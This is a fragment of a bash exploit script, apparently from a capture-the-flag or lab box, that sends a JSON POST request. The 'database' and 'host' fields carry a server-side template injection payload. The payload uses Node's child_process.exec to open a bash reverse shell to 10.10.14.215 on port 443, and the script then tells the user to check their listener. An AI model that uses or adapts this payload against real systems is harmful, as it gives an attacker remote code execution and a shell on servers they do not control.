...
POST_DATA=$(cat <<EOF
{
  ...
  "data": {
    "host": "",
    "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.215/443 0>&1\"')}}"
  },
  "host": "",
  "database": "{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.215/443 0>&1\"')}}"
}
...
echo "Exploit sent. If everything went well, check your listener for a connection on port 443."
